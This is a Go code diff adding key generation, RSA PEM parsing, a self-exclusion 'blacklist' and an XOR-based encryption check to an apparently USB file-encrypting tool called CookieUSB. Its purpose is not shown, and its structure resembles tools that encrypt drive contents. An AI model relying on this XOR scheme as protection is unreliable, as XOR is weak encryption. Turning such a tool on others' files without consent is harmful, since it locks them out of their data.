@@ -6,6 +6,8 @@ import (
 	"fmt"
 	"os"
 
+	"./crypto/xor"
+
 	"crypto/rsa"
 	"crypto/x509"
 	"encoding/pem"
@@ -60,6 +62,12 @@ func GenerateIV() ([]byte, error) {
 	return b, err
 }
 
+func GenerateKey() ([]byte, error) {
+	b := make([]byte, 32)
+	_, err := rand.Read(b)
+	return b, err
+}
+
 // Contains : Check if the string is in the array
 func Contains(s string, list []string) bool {
 	for _, e := range list {
@@ -82,4 +90,46 @@ func GetPEMKey(key *rsa.PrivateKey) (privateKey string, publicKey string, err er
 		Bytes: pbKeyDer,
 	}
 	return string(pem.EncodeToMemory(&prKeyBlock)), string(pem.EncodeToMemory(&pbKeyBlock)), err
+}
+
+func GetRSAKeys(publicKey []byte, privateKey []byte) (*rsa.PrivateKey, *rsa.PublicKey, error) {
+	block, _ := pem.Decode(publicKey)
+	if block == nil {
+		return nil, nil, errors.New("Error")
+	}
+	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
+	if err != nil {
+		return nil, nil, err
+	}
+	var pbKey *rsa.PublicKey
+	switch pub := pub.(type) {
+	case *rsa.PublicKey:
+		pbKey = pub
+	default:
+		break
+	}
+	block, _ = pem.Decode(privateKey)
+	if block == nil {
+		return nil, nil, errors.New("Error")
+	}
+	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
+	if err != nil {
+		return nil, nil, err
+	}
+	return priv, pbKey, nil
+}
+
+func IsBlacklisted(fileName string) bool {
+	blacklist := []string{configName, "CookieUSB_win.exe", "CookieUSB_darwin", "CookieUSB_win"}
+	return Contains(fileName, blacklist)
+}
+
+func IsEncrypted(data []byte) bool {
+	key := xor.XorKey{Key: FileKey}
+	decryptedData := key.Decrypt(data)
+	_, err := DeserializeAsFile(decryptedData)
+	if err != nil {
+		return false
+	}
+	return true
 }
